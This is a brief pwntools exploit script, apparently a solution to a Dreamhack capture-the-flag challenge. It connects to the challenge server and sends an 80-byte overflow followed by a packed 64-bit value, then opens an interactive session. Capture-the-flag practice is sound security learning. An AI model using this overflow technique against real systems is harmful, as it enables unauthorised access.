from pwn import *

#p = process('./chall')
p = remote('host3.dreamhack.games', 12850)

payload = b"a"*80 + p64(1)
p.sendline(payload)
p.interactive()